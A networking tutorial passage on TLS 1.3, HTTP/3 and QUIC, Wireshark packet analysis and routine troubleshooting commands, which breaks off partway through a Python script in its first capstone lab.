# Part 5: Modern Web Security & Packet Analysis

## Securing the Internet: TLS, HTTP/3, QUIC, and Network Forensics

---

## Synopsis

Modern Internet communication depends on encryption, low-latency transport, and sophisticated packet analysis. The final tutorial explores how TLS secures communication, why HTTP/3 abandoned TCP in favor of QUIC, and how professionals analyze network traffic to diagnose performance issues and investigate cybersecurity incidents.

Readers will consolidate everything learned throughout the series by analyzing complete protocol stacks captured from real-world traffic, building a TLS client, and performing comprehensive packet analysis.

By the end of this part, you'll understand how to secure applications, analyze network traffic like a professional, and troubleshoot complex networking issues in production environments.

---

## Prerequisites

Before starting Part 5, ensure you have:
1. **Completed Parts 1-4** or have equivalent knowledge
2. **Wireshark** installed and working
3. **Python 3.8+** with `pip` available
4. **OpenSSL** installed (`openssl version`)
5. **curl** with HTTP/3 support (or build from source)
6. **Root/Administrator privileges** for packet capture

---

## Part 5 Roadmap

```
┌─────────────────────────────────────────────────────────────┐
│              PART 5: SECURITY & PACKET ANALYSIS             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Cryptography Fundamentals                               │
│     ├─ Symmetric Encryption                                │
│     ├─ Asymmetric Encryption                               │
│     ├─ Hashing & Digital Signatures                       │
│     └─ Public Key Infrastructure (PKI)                    │
│                                                             │
│  2. TLS 1.3                                                │
│     ├─ TLS Handshake Sequence                              │
│     ├─ Session Keys & Perfect Forward Secrecy             │
│     ├─ Certificate Validation                              │
│     ├─ ALPN (Application-Layer Protocol Negotiation)      │
│     ├─ Session Resumption & 0-RTT                         │
│     └─ Comparing TLS 1.2 vs 1.3                           │
│                                                             │
│  3. HTTP/3 & QUIC                                          │
│     ├─ QUIC Architecture                                   │
│     ├─ UDP Transport                                       │
│     ├─ Stream Multiplexing                                 │
│     ├─ Connection Migration                                │
│     ├─ Head-of-Line Blocking Elimination                  │
│     └─ Performance Improvements                           │
│                                                             │
│  4. Packet Analysis with Wireshark                         │
│     ├─ Display Filters & Capture Filters                  │
│     ├─ Following TCP Streams                               │
│     ├─ Exporting Objects                                   │
│     ├─ Protocol Statistics                                 │
│     ├─ Expert Information                                  │
│     └─ TCP Stream Analysis                                 │
│                                                             │
│  5. Network Troubleshooting                                 │
│     ├─ Slow Websites                                       │
│     ├─ DNS Failures                                       │
│     ├─ Packet Loss                                        │
│     ├─ MTU Issues                                         │
│     ├─ TLS Handshake Failures                             │
│     └─ HTTP Latency                                       │
│                                                             │
│  6. Capstone Labs                                           │
│     ├─ Lab 1: Capture a Complete Web Browsing Session     │
│     ├─ Lab 2: Decrypt HTTPS Traffic                       │
│     ├─ Lab 3: Compare HTTP/2 and HTTP/3 Performance      │
│     ├─ Lab 4: Analyze Malicious DNS Traffic               │
│     ├─ Lab 5: Investigate an SMTP Phishing Email          │
│     └─ Lab 6: Diagnose Packet Loss                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Section 1: Cryptography Fundamentals

### Symmetric Encryption

**Symmetric encryption** uses the same key for encryption and decryption. It's fast and efficient for bulk data.

```
┌─────────────────────────────────────────────────────────────┐
│                    SYMMETRIC ENCRYPTION                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Plaintext: "Hello, World!"                               │
│       │                                                     │
│       ▼                                                     │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Encryption (AES, ChaCha20)                        │  │
│  │  Key: "secret-key-12345"                          │  │
│  └──────────────────────────────────────────────────────┘  │
│       │                                                     │
│       ▼                                                     │
│  Ciphertext: "a7b3c9d1e5f8..."                             │
│       │                                                     │
│       │  Transmission (insecure channel)                   │
│       ▼                                                     │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Decryption (same key)                             │  │
│  │  Key: "secret-key-12345"                          │  │
│  └──────────────────────────────────────────────────────┘  │
│       │                                                     │
│       ▼                                                     │
│  Plaintext: "Hello, World!"                               │
│                                                             │
│  Common Algorithms: AES, ChaCha20, 3DES                   │
│  Key Distribution Problem: How to share the key securely?  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Asymmetric Encryption

**Asymmetric encryption** (public-key cryptography) uses a key pair: public key for encryption, private key for decryption.

```
┌─────────────────────────────────────────────────────────────┐
│                    ASYMMETRIC ENCRYPTION                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Key Generation:                                        │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Public Key  (encryption)   Private Key (decryption) │ │
│     │  89ab:cd34:...               f012:3456:...          │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  2. Encryption (Sender):                                   │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Plaintext -> RSA/ECC -> Ciphertext              │ │
│     │  Using RECIPIENT'S Public Key                     │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  3. Transmission                                            │
│                                                             │
│  4. Decryption (Recipient):                                │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Ciphertext -> RSA/ECC -> Plaintext              │ │
│     │  Using RECIPIENT'S Private Key                    │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  Common Algorithms: RSA, ECC (Elliptic Curve)             │
│  Advantage: No key distribution problem                    │
│  Disadvantage: Much slower than symmetric                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Hybrid Encryption (TLS Approach)

TLS combines both types: asymmetric for key exchange, symmetric for bulk encryption.

```
┌─────────────────────────────────────────────────────────────┐
│                    HYBRID ENCRYPTION (TLS)                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Handshake (Asymmetric):                                 │
│     └─ Client and server establish a shared secret key    │
│     └─ Using RSA or ECDHE (Diffie-Hellman)               │
│                                                             │
│  2. Data Transfer (Symmetric):                             │
│     └─ All subsequent data encrypted with AES/ChaCha20   │
│     └─ Using the shared secret key                        │
│                                                             │
│  Benefits:                                                  │
│  ├─ Asymmetric: Secure key exchange (no key sharing)      │
│  └─ Symmetric: Fast bulk encryption                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Hashing and Digital Signatures

**Hashing** creates a fixed-size digest of data, while **digital signatures** provide authentication and integrity.

```
┌─────────────────────────────────────────────────────────────┐
│                    HASHING & SIGNATURES                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Hashing:                                                   │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Data -> Hash Function -> Fixed-size Digest           ││
│  │  "Hello, World!" -> SHA-256 -> a591a6d40bf420404a... ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Properties:                                                │
│  ├─ Deterministic: Same input → same output               │
│  ├─ One-way: Can't reconstruct input from hash            │
│  └─ Collision-resistant: Different inputs → different hash│
│                                                             │
│  Digital Signature:                                         │
│  ┌────────────────────────────────────────────────────────┐│
│  │  1. Hash the message                                 ││
│  │  2. Encrypt the hash with sender's PRIVATE key      ││
│  │  3. Attach encrypted hash to message                 ││
│  │                                                       ││
│  │  Receiver:                                            ││
│  │  1. Decrypt signature with sender's PUBLIC key      ││
│  │  2. Compare with own hash of message                ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Common Hash Algorithms: SHA-256, SHA-384, SHA-512        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Public Key Infrastructure (PKI)

```
┌─────────────────────────────────────────────────────────────┐
│                    PKI HIERARCHY                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │              Root CA (Self-Signed)                │    │
│  │  "Trust Anchor" - Pre-installed in browsers/OS    │    │
│  └────────────────────────────────────────────────────┘    │
│                         │                                    │
│              ┌──────────┼──────────┐                       │
│              ▼          ▼          ▼                       │
│  ┌────────────────┐ ┌────────────────┐ ┌────────────────┐  │
│  │ Intermediate CA│ │ Intermediate CA│ │ Intermediate CA│  │
│  └────────────────┘ └────────────────┘ └────────────────┘  │
│         │                  │                  │             │
│         ▼                  ▼                  ▼             │
│  ┌────────────────┐ ┌────────────────┐ ┌────────────────┐  │
│  │  Example.com   │ │  Google.com    │ │  Facebook.com  │  │
│  │  Certificate   │ │  Certificate   │ │  Certificate   │  │
│  └────────────────┘ └────────────────┘ └────────────────┘  │
│                                                             │
│  Certificate Chain:                                         │
│  ├─ Leaf Certificate: example.com                          │
│  ├─ Intermediate CA: Signed by Root CA                    │
│  └─ Root CA: Pre-trusted by the OS/browser               │
│                                                             │
│  X.509 Certificate Contents:                                │
│  ├─ Subject: CN=example.com, O=Example Corp               │
│  ├─ Issuer: CN=Example Intermediate CA                    │
│  ├─ Validity: Not Before/Not After dates                  │
│  ├─ Public Key: RSA 2048 or ECDSA P-256                  │
│  ├─ Signature: SHA-256 with RSA                          │
│  ├─ SAN (Subject Alternative Names):                      │
│  │   - www.example.com, api.example.com                  │
│  └─ Extensions: Key Usage, Extended Key Usage            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Section 2: TLS 1.3

### What is TLS?

**TLS (Transport Layer Security)** provides secure communication over the Internet. It encrypts data, authenticates servers (and optionally clients), and ensures integrity.

**Analogy**: TLS is like sending a package in a tamper-proof, locked box with a transparent window showing the return address. Anyone can see where it's from (server authentication), but only the recipient can open it (encryption), and any tampering is visible (integrity).

### TLS 1.3 vs 1.2

| Feature | TLS 1.2 | TLS 1.3 |
|---------|---------|---------|
| **Handshake Time** | 2 RTT | 1 RTT (or 0-RTT) |
| **Cipher Suites** | Many (some weak) | Few (all strong) |
| **Perfect Forward Secrecy** | Optional | Mandatory |
| **Supported Algorithms** | RSA, ECDHE, DHE | ECDHE only for key exchange |
| **Resumption** | Session IDs/Session Tickets | PSK (Pre-Shared Keys) |
| **0-RTT** | No | Yes |
| **Deprecated Features** | - | Compression, renegotiation, non-AEAD ciphers |

### TLS 1.3 Handshake

```
┌─────────────────────────────────────────────────────────────┐
│                    TLS 1.3 HANDSHAKE                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client                                    Server           │
│          │                                    │             │
│  1. ClientHello:                           │             │
│     ├─ Supported cipher suites              │             │
│     ├─ Key share (ECDHE public key)         │             │
│     ├─ Supported groups (P-256, X25519)    │             │
│     └─ ALPN: http/1.1, h2                  │             │
│          ├───────────────────────────────────►│             │
│          │                                    │             │
│  2. ServerHello:                           │             │
│     ├─ Selected cipher suite                │             │
│     ├─ Key share (ECDHE public key)         │             │
│     └─ EncryptedExtensions:                  │             │
│         ├─ ALPN: h2                         │             │
│         └─ Server certificate               │             │
│          │◄───────────────────────────────────┤             │
│          │                                    │             │
│  3. Client finishes:                        │             │
│     ├─ Client verifies certificate          │             │
│     ├─ Computes shared secret               │             │
│     └─ Sends Finished message               │             │
│          ├───────────────────────────────────►│             │
│          │                                    │             │
│  4. Server finishes:                        │             │
│     ├─ Server verifies Client Finished      │             │
│     └─ Sends Application Data               │             │
│          │◄───────────────────────────────────┤             │
│          │                                    │             │
│          │        [HANDSHAKE COMPLETE]        │             │
│          │                                    │             │
└─────────────────────────────────────────────────────────────┘
```

### Perfect Forward Secrecy

**Perfect Forward Secrecy (PFS)** ensures that if a long-term private key is compromised, past sessions remain secure.

```
┌─────────────────────────────────────────────────────────────┐
│                    PERFECT FORWARD SECRECY                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Without PFS:                                               │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Server Private Key (compromised)                    ││
│  │         │                                             ││
│  │         ▼                                             ││
│  │  Can decrypt ALL past sessions                       ││
│  │  (because session key encrypted with server's key)   ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  With PFS (using ECDHE):                                    │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Session key derived from ephemeral keys:             ││
│  │  ┌──────────────────────────────────────────────────┐ ││
│  │  │  Client Ephemeral Key + Server Ephemeral Key   │ ││
│  │  │          (both short-lived)                     │ ││
│  │  └──────────────────────────────────────────────────┘ ││
│  │                                                       ││
│  │  Even if server's private key is compromised:        ││
│  │  └─ Past sessions remain secure                     ││
│  │  └─ Because ephemeral keys are discarded after use   ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  ECDHE: Elliptic Curve Diffie-Hellman Ephemeral            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Certificate Validation

```
┌─────────────────────────────────────────────────────────────┐
│                    CERTIFICATE VALIDATION                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Browser validation checks:                                 │
│                                                             │
│  1. Certificate Chain:                                      │
│     ├─ Verify leaf certificate -> intermediate -> root    │
│     └─ Check each signature in the chain                  │
│                                                             │
│  2. Validity Period:                                       │
│     ├─ Check Not Before < Current Time < Not After        │
│     └─ Alert if outside validity window                   │
│                                                             │
│  3. Revocation Status:                                     │
│     ├─ OCSP (Online Certificate Status Protocol)         │
│     ├─ CRL (Certificate Revocation List)                 │
│     └─ OCSP Stapling (server provides status)            │
│                                                             │
│  4. Domain Name Matching:                                  │
│     ├─ CN (Common Name) in subject field                  │
│     └─ SAN (Subject Alternative Names)                     │
│         └─ Must contain the visited domain                │
│                                                             │
│  5. Key Usage:                                             │
│     ├─ Digital Signature                                   │
│     ├─ Key Encipherment                                   │
│     └─ Server Authentication                              │
│                                                             │
│  All checks must pass for the connection to be trusted.    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 0-RTT (Zero Round Trip Time Resumption)

```
┌─────────────────────────────────────────────────────────────┐
│                    0-RTT RESUMPTION                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Initial Connection (1-RTT):                               │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Client -> Server: ClientHello (no data)             ││
│  │  Server -> Client: ServerHello, Cert, ...           ││
│  │  Client -> Server: Finished, Application Data       ││
│  │  Server -> Client: Application Data                  ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  After initial connection, server sends a PSK:             │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Server sends: NewSessionTicket message              ││
│  │  PSK = Pre-Shared Key (derived from session)         ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Subsequent connections (0-RTT):                           │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Client -> Server: ClientHello + PSK + Early Data    ││
│  │  (Application data sent immediately!)                ││
│  │  Server -> Client: ServerHello, Finished, Data      ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Benefits:                                                  │
│  ├─ Eliminates one RTT for resumed sessions               │
│  ├─ Dramatically faster for repeat connections            │
│  └─ Important for mobile and latency-sensitive apps      │
│                                                             │
│  Security: 0-RTT data is not PFS-protected                 │
│  └─ Use only for idempotent requests                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Section 3: HTTP/3 and QUIC

### Why QUIC?

**QUIC (Quick UDP Internet Connections)** solves TCP's limitations:

| Problem | TCP | QUIC | Improvement |
|---------|-----|------|-------------|
| **Head-of-Line Blocking** | Single stream blocked by lost packet | Multiple independent streams | 3-4x faster |
| **Connection Migration** | IP change breaks connection | Connection ID persists | Seamless transitions |
| **Handshake Time** | 2-3 RTT (with TLS) | 0-1 RTT | 50-70% faster |
| **Congestion Control** | Fixed algorithms | Pluggable | Adaptable |
| **Secure by Default** | Optional (TLS) | Built-in (TLS 1.3) | Always secure |

```
┌─────────────────────────────────────────────────────────────┐
│                    TCP vs QUIC STACK                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  TCP/IP Stack:                                              │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Application (HTTP/1.1, HTTP/2)                      ││
│  │  TLS (optional)                                      ││
│  │  TCP                                                 ││
│  │  IP                                                  ││
│  │  Ethernet                                            ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  QUIC Stack:                                                │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Application (HTTP/3)                                ││
│  │  QUIC (HTTP/2 semantics, TLS 1.3 built-in)          ││
│  │  UDP                                                 ││
│  │  IP                                                  ││
│  │  Ethernet                                            ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  QUIC combines:                                             │
│  ├─ TLS 1.3 (encryption)                                  │
│  ├─ TCP (reliability)                                    │
│  └─ HTTP/2 (stream multiplexing)                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### QUIC Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    QUIC ARCHITECTURE                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Application Data (HTTP/3, DNS-over-QUIC, etc.)  │    │
│  └────────────────────────────────────────────────────┘    │
│                         │                                   │
│  ┌────────────────────────────────────────────────────┐    │
│  │  QUIC Streams (Multiple independent streams)       │    │
│  │  ├─ Stream 1: HTML                                │    │
│  │  ├─ Stream 3: CSS                                │    │
│  │  ├─ Stream 5: JavaScript                         │    │
│  │  └─ Stream 7: Images                             │    │
│  └────────────────────────────────────────────────────┘    │
│                         │                                   │
│  ┌────────────────────────────────────────────────────┐    │
│  │  QUIC Frame Layer (Frames: STREAM, ACK, etc.)     │    │
│  └────────────────────────────────────────────────────┘    │
│                         │                                   │
│  ┌────────────────────────────────────────────────────┐    │
│  │  TLS 1.3 (Encryption & Authentication)             │    │
│  └────────────────────────────────────────────────────┘    │
│                         │                                   │
│  ┌────────────────────────────────────────────────────┐    │
│  │  QUIC Packet Layer (Version, Connection ID)       │    │
│  └────────────────────────────────────────────────────┘    │
│                         │                                   │
│  ┌────────────────────────────────────────────────────┐    │
│  │  UDP (Port 443)                                  │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Stream Multiplexing

```
┌─────────────────────────────────────────────────────────────┐
│                    QUIC STREAM MULTIPLEXING                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Single UDP Connection (443)                                │
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Stream 1 (Request HTML)                          │    │
│  │  ┌──────────────────────────────────────────────┐ │    │
│  │  │ ████████████████████████████                │ │    │
│  │  └──────────────────────────────────────────────┘ │    │
│  │                                                     │    │
│  │  Stream 3 (Request CSS)                           │    │
│  │  ┌──────────────────────────────────────────────┐ │    │
│  │  │ ████████                                    │ │    │
│  │  └──────────────────────────────────────────────┘ │    │
│  │                                                     │    │
│  │  Stream 5 (Request JavaScript)                    │    │
│  │  ┌──────────────────────────────────────────────┐ │    │
│  │  │ ████████████████                           │ │    │
│  │  └──────────────────────────────────────────────┘ │    │
│  │                                                     │    │
│  │  Stream 7 (Request Image)                         │    │
│  │  ┌──────────────────────────────────────────────┐ │    │
│  │  │ ████████████████████████████████████       │ │    │
│  │  └──────────────────────────────────────────────┘ │    │
│  │                                                     │    │
│  │  ALL streams are INDEPENDENT                       │    │
│  │  ├─ Lost packet in Stream 3 doesn't block others   │    │
│  │  └─ Each stream has its own flow control          │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Connection Migration

```
┌─────────────────────────────────────────────────────────────┐
│                    CONNECTION MIGRATION                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Client connected on WiFi:                              │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Client IP: 192.168.1.10                          │ │
│     │  Connection ID: 0x12345678                        │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  2. Client moves to cellular:                              │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Client IP: 10.0.0.15                             │ │
│     │  Connection ID: 0x12345678 (SAME!)               │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  3. Client sends new packet with same Connection ID:      │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Packet uses new source IP and port               │ │
│     │  Server recognizes Connection ID                  │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  4. Server updates its address mapping:                    │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Connection ID 0x12345678 -> 10.0.0.15:54321     │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  Benefits:                                                  │
│  ├─ No TCP connection re-establishment                    │
│  ├─ Seamless transition between networks                  │
│  └─ Essential for mobile and roaming devices             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Performance Comparison

```
┌─────────────────────────────────────────────────────────────┐
│                    PROTOCOL PERFORMANCE                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Latency Comparison (Time to First Byte):                  │
│  ┌────────────────────────────────────────────────────────┐│
│  │  HTTP/1.1 (TCP + TLS): 2 RTT                         ││
│  │  HTTP/2 (TCP + TLS): 2 RTT                           ││
│  │  HTTP/3 (QUIC): 1 RTT (or 0-RTT for resumption)     ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Throughput Comparison (With 5% packet loss):              │
│  ┌────────────────────────────────────────────────────────┐│
│  │  HTTP/1.1: ████████████ (baseline)                   ││
│  │  HTTP/2:   ████████████████████ (3x)                  ││
│  │  HTTP/3:   ████████████████████████████████ (5x)     ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Use Cases:                                                 │
│  ├─ HTTP/1.1: Legacy systems                              │
│  ├─ HTTP/2: Modern web (most sites)                      │
│  └─ HTTP/3: Performance-critical applications             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Section 4: Packet Analysis with Wireshark

### Essential Wireshark Features

```
┌─────────────────────────────────────────────────────────────┐
│                    WIRESHARK ANALYSIS TOOLS                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Capture Filters (BPF - Berkeley Packet Filter):        │
│     ┌────────────────────────────────────────────────────┐ │
│     │  host 192.168.1.10                               │ │
│     │  port 80 or port 443                            │ │
│     │  tcp and port 22                                │ │
│     │  not arp                                        │ │
│     │  src net 10.0.0.0/8                            │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  2. Display Filters:                                       │
│     ┌────────────────────────────────────────────────────┐ │
│     │  http.request.method == "GET"                    │ │
│     │  tcp.flags.syn == 1                              │ │
│     │  dns.qry.name contains "example"                │ │
│     │  tls.handshake.type == 1                        │ │
│     │  ip.addr == 8.8.8.8                             │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  3. Follow Streams:                                        │
│     ┌────────────────────────────────────────────────────┐ │
│     │  TCP Stream: Complete conversation               │ │
│     │  HTTP Stream: Request + Response                 │ │
│     │  TLS Stream: Encrypted data (with keylog)       │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
│  4. Expert Information:                                    │
│     ┌────────────────────────────────────────────────────┐ │
│     │  Errors: Malformed packets, checksum errors      │ │
│     │  Warnings: TCP retransmissions, dup ACKs        │ │
│     │  Notes: Conversation IDs, reassembled packets   │ │
│     └────────────────────────────────────────────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### TCP Stream Analysis

```
┌─────────────────────────────────────────────────────────────┐
│                    TCP STREAM ANALYSIS                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Key Metrics to Monitor:                                    │
│                                                             │
│  ┌────────────────────────────────────────────────────────┐│
│  │  1. Retransmissions                                  ││
│  │     └─ High count → Network congestion/packet loss   ││
│  │                                                       ││
│  │  2. Duplicate ACKs                                  ││
│  │     └─ Indicates out-of-order delivery              ││
│  │                                                       ││
│  │  3. Window Scaling                                   ││
│  │     └─ Negotiated in SYN/SYN-ACK                    ││
│  │     └─ Affects throughput                           ││
│  │                                                       ││
│  │  4. RTT (Round Trip Time)                            ││
│  │     └─ Time between data and ACK                    ││
│  │     └─ High values → Network latency                ││
│  │                                                       ││
│  │  5. Zero Window                                   ││
│  │     └─ Receiver's buffer is full                   ││
│  │     └─ Indicates slow application processing       ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Analysis Commands:                                         │
│  tshark -r capture.pcap -Y "tcp.analysis.retransmission"   │
│  tshark -r capture.pcap -Y "tcp.analysis.duplicate_ack"    │
│  tshark -r capture.pcap -z io,stat,0,                     │
│    "tcp.analysis.retransmission"                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Protocol Statistics

```
┌─────────────────────────────────────────────────────────────┐
│                    PROTOCOL STATISTICS                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Protocol Hierarchy:                                        │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Protocol      Packets   Bytes     % Packets   % Bytes││
│  ├────────────────────────────────────────────────────────┤│
│  │  Ethernet      12,345    987,654   100.0%     100.0% ││
│  │  └─ IPv4       12,000    960,000    97.2%      97.2% ││
│  │     ├─ TCP     10,000    800,000    81.0%      81.0% ││
│  │     │  ├─ HTTP  8,000    600,000    64.8%      60.8% ││
│  │     │  └─ TLS   2,000    200,000    16.2%      20.3% ││
│  │     └─ UDP      2,000    160,000    16.2%      16.2% ││
│  │        └─ DNS   1,500     60,000    12.2%       6.1% ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  IO Statistics:                                             │
│  ┌────────────────────────────────────────────────────────┐│
│  │  Interval   Packets   Bytes    Rate (bytes/sec)      ││
│  ├────────────────────────────────────────────────────────┤│
│  │  0s-1s      1,234     98,765   98,765                ││
│  │  1s-2s      1,567    125,360  125,360                ││
│  │  2s-3s        987     78,960   78,960                ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Command-line:                                              │
│  tshark -r capture.pcap -z protocol,hierarchy              │
│  tshark -r capture.pcap -z io,stat,1                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Section 5: Network Troubleshooting

### Common Problems and Solutions

```
┌─────────────────────────────────────────────────────────────┐
│                    TROUBLESHOOTING GUIDE                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Slow Website Load Times:                                │
│     ├─ Check: DNS lookup time (dig +trace)                │
│     ├─ Check: TCP handshake time (Wireshark)              │
│     ├─ Check: TLS handshake time (Wireshark)              │
│     ├─ Check: Server response time (curl -w)              │
│     └─ Solution: Content caching, CDN, HTTP/2 or HTTP/3   │
│                                                             │
│  2. DNS Failures:                                          │
│     ├─ Check: DNS server reachability (ping)              │
│     ├─ Check: DNS query response (dig, nslookup)          │
│     ├─ Check: DNS cache (ipconfig /displaydns)           │
│     └─ Solution: Change DNS servers, check firewall       │
│                                                             │
│  3. Packet Loss:                                           │
│     ├─ Check: ping -c 100 -i 0.2 target                  │
│     ├─ Check: Wireshark for retransmissions               │
│     ├─ Check: Network congestion (iperf3)                 │
│     └─ Solution: Reduce MTU, increase bandwidth          │
│                                                             │
│  4. MTU Issues:                                            │
│     ├─ Check: ping -M do -s 1472 target                  │
│     ├─ Check: ICMP Fragmentation Needed messages          │
│     └─ Solution: Adjust interface MTU, PMTU discovery    │
│                                                             │
│  5. TLS Handshake Failures:                                │
│     ├─ Check: Certificate validity (openssl s_client)    │
│     ├─ Check: Cipher suite compatibility                  │
│     ├─ Check: Server SNI support                         │
│     └─ Solution: Update TLS versions, fix certificates   │
│                                                             │
│  6. HTTP Latency:                                          │
│     ├─ Check: HTTP/1.1 vs HTTP/2 multiplexing            │
│     ├─ Check: Server-side processing time (X-Response-Time)│
│     ├─ Check: Asset size (large images, JS bundles)       │
│     └─ Solution: Optimize assets, enable compression     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Troubleshooting Tool Commands

```
┌─────────────────────────────────────────────────────────────┐
│                    TROUBLESHOOTING COMMANDS                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DNS Troubleshooting:                                       │
│  dig example.com +trace                                    │
│  nslookup example.com 8.8.8.8                              │
│  host -v example.com                                       │
│                                                             │
│  Network Connectivity:                                      │
│  ping -c 10 8.8.8.8                                       │
│  traceroute -n 8.8.8.8                                    │
│  mtr -r -c 10 8.8.8.8                                    │
│                                                             │
│  Port/TCP Testing:                                         │
│  nc -zv google.com 80                                     │
│  telnet google.com 80                                     │
│  nmap -p 80,443 google.com                               │
│                                                             │
│  HTTP Testing:                                              │
│  curl -I https://example.com                               │
│  curl -w "\n%{time_total}\n" -o /dev/null -s https://...  │
│  httping -c 10 https://example.com                        │
│                                                             │
│  TLS Testing:                                               │
│  openssl s_client -connect example.com:443               │
│  openssl s_client -showcerts -connect example.com:443    │
│  openssl x509 -in cert.pem -text -noout                   │
│                                                             │
│  Bandwidth Testing:                                         │
│  iperf3 -c server -p 5201                                 │
│  speedtest-cli                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Section 6: Capstone Labs

---

### Lab 1: Capture a Complete Web Browsing Session

**The Target**: Capture and analyze a complete HTTP/HTTPS browsing session.

**The Implementation**:

1. **Start packet capture**:
   ```bash
   sudo tcpdump -i eth0 -vv -w complete_session.pcap
   ```

2. **In a browser, visit multiple websites**:
   - `http://example.com` (HTTP)
   - `https://www.google.com` (HTTPS/TLS)
   - `https://www.github.com` (HTTPS/TLS with HTTP/2)

3. **Stop the capture**.

4. **Analyze the session**:
   ```bash
   # Show all packets
   tshark -r complete_session.pcap
   
   # Show protocol hierarchy
   tshark -r complete_session.pcap -z protocol,hierarchy
   
   # Show conversations
   tshark -r complete_session.pcap -z conv,tcp
   
   # Export HTTP objects
   tshark -r complete_session.pcap --export-objects "http,./exported"
   
   # Show DNS requests
   tshark -r complete_session.pcap -Y "dns" -T fields -e dns.qry.name
   ```

5. **Create a Python script to summarize**:
   ```python
   #!/usr/bin/env python3
   """
   summarize_session.py - Summarize a complete browsing session
   """
   
   import sys
   from scapy.all import rdpcap, IP, TCP, UDP, DNS, HTTP
   from collections import defaultdict
   
   def summarize(filename):
       packets = rdpcap(filename)
       
       # Statistics
       stats = defaultdict(int)
       for p in packets:
           if IP in p:
               stats['Total'] += 1
               if TCP in p:
                   stats['TCP'] += 1
                   if p[TCP].dport == 80 or p[TCP].sport == 80:
                       stats['HTTP'] += 1
                   if p[TCP].dport == 443 or p[TCP].sport == 443:
                       stats['HTTPS'] += 1
               elif UDP in p:
